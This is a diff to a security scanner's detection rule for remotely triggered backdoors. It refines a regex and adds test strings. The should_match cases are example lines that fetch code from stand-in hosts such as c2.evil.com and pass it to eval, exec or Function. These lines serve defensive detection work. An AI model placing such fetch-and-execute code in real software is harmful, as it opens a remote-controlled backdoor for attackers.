@@ -84,17 +84,21 @@
       "title": "Network-triggered activation",
       "description": "Code that fetches configuration from a remote server to decide what to execute may be a remotely-controlled backdoor.",
       "severity": "critical",
-      "pattern": "(?i)(fetch|axios|request|http\\.get|urllib|requests\\.get)\\s*\\([^)]+\\)[^;]*\\.then\\s*\\([^)]*\\b(eval|exec|Function|spawn|child_process)",
+      "pattern": "(?i)(fetch|axios(\\.\\w+)?|request|http\\.get|urllib|requests\\.get)\\s*\\([^)]+\\)\\.then\\s*\\(\\s*\\w+\\s*=>.*?(eval|exec|Function|spawn|child_process)\\s*\\(\\s*\\w+\\.(text\\s*\\(\\)|data|body|content)",
       "file_extensions": ["js", "ts", "mjs", "cjs", "py"],
       "remediation": "Never execute code fetched from remote servers.",
       "test_cases": {
         "should_match": [
           "fetch('https://c2.evil.com/cmd').then(r => eval(r.text()))",
-          "axios('https://evil.com/payload').then(data => exec(data))"
+          "axios('https://evil.com/payload').then(data => exec(data.body))",
+          "fetch(url).then(response => eval(response.data))",
+          "request(endpoint).then(x => Function(x.content)())"
         ],
         "should_not_match": [
           "fetch('https://api.com/data').then(r => r.json())",
-          "axios.get('/api/users').then(res => setUsers(res.data))"
+          "axios.get('/api/users').then(res => setUsers(res.data))",
+          "fetch(url, {method: 'POST'}).then(r => console.log(r))",
+          "request('wallet_sendTransaction').then(result => callback(result))"
         ]
       }
     }
